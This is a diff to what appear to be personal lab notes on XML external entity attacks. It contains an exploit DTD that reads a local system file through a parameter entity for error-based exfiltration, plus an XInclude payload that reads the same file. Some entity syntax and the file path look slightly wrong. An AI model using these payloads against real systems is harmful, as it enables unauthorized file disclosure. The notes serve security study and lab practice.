@@ -147,6 +147,13 @@ while I am getting error I get back the file content in the response
 LAB:
 exploit.dtd
 <!ENTITY % file SYSTEM "file:///etc/password">
-<!ENTITY % stack "<ENTITY &#x25; exfiltrate SYSTEM 'file:///sdfsdfsd/$file;'>">
+<!ENTITY % stack "<ENTITY &#x25; exfiltrate SYSTEM 'file:///sdfsdfsd/$file'>">
 %stack;
 %exfiltrate;
+
+&error; // %26error;
+  so if I got error back then this means that backend is using xml
+
+xinclude: (I can define sub-xml documents inside xml document)
+  <foo xmlns:xi="http://w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/password"/></foo>
